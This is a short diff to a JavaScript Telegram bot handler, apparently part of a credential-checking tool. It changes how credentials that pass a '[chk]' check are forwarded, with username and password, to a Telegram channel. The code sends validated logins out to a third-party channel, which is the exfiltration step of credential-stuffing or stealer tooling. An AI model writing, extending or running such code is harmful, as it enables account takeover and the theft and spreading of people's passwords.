@@ -369,8 +369,8 @@ function initializeTelegramHandler(botToken, options = {}) {
             }
           }
           
-          // Forward to channel (if configured)
-          await forwardValidToChannel(ctx.telegram, creds.username, creds.password, capture);
+          // Forward to channel (if configured) - send the exact same message
+          await forwardValidToChannel(ctx.telegram, creds.username, creds.password, finalMessage);
         } catch (captureErr) {
           log.warn(`[chk] capture failed: ${captureErr.message}`);
           // Still show the check result even if capture failed
